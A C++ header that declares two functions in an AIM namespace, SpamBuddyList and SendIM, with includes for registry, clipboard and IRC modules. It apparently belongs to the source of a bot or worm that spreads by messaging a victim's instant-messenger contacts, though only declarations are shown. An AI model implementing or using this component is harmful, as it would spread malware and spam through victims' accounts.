#pragma once

#include <windows.h>
#include <vector>
#include <string>
#include "registry.h"
#include "debug.h"
#include "thread.h"
#include "clipboard.h"
#include "irc.h"

namespace AIM
{
	VOID SpamBuddyList(PCHAR Message, DWORD MinIdleTime);
	VOID SendIM(PCHAR ScreenName, LPCTSTR Message, BOOL Close);
}